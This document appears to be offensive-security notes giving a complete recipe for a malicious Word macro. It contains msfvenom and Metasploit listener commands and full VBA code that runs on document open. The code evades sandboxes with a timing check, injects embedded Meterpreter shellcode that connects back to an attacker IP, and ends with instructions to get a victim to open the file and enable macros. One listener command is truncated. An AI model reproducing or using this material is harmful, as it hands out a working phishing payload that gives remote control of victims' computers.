

## VBA Shellcode Injection - Step by Step

### Step 1: Generate Shellcode (Kali)

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 -f vbapplication
```

Copy the `buf = Array(...)` output.
### Step 2: Start Listener (Kali)

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.45.214; set LPORT 443; run"
```
### Step 3: Create Word Document (Windows)

1. Open Word
2. Click **Developer** tab → **Visual Basic**
3. Double-click **ThisDocument** in left pane
4. Paste this macro:
```vb
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim t1 As Date
    Dim t2 As Date
    
    t1 = Now
    Sleep 3000
    t2 = Now
    If DateDiff("s", t1, t2) < 2 Then Exit Sub
    
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr  


    buf = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,139,114,40,49,255,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,139,66,60,1,208,87,139,64,120,133,192,116,76,1,208,80,139,88,32,139,72,24,1,211,133,201,116,60,73,49, _
255,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,112,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,41,32,65,112,112,108,101,87,101,98,75,105,116,47,53,51,55,46,51,54,32, _
40,75,72,84,77,76,44,32,108,105,107,101,32,71,101,99,107,111,41,32,67,104,114,111,109,101,47,49,50,51,46,48,46,48,46,48,32,83,97,102,97,114,105,47,53,51,55,46,51,54,0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,255,0,0,0,47,116,118,113,107,53, _
105,102,121,121,71,100,83,109,70,79,90,79,45,75,101,52,119,82,49,101,54,104,56,111,119,65,69,97,78,106,80,68,81,67,57,80,89,89,109,48,117,56,73,119,109,68,80,55,105,102,108,118,75,71,104,67,105,51,85,71,97,82,79,51,48,73,101,49,109,79,116,57,50,120,107,73,101,70,67,115, _
102,118,69,52,90,75,70,78,112,90,112,78,84,109,120,106,102,121,110,78,75,115,54,108,65,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83, _
83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139, _
7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,52,53,46,49,55,53,0,187,240,181,162,86,106,0,83,255,213)
    
    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    WaitForSingleObject res, &HFFFFFFFF
End Sub
```

5. Replace `buf = Array(252, 232, ...)` with msfvenom output from Step 1
6. Close VBA editor
### Step 4: Save Document

1. File → Save As
2. Change type to **Word 97-2003 Document (.doc)**
3. Name it and save
### Step 5: Revshell

```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHO run"
```
### Step 6: Deliver
Transfer `.doc` to target and get victim to open + enable macros.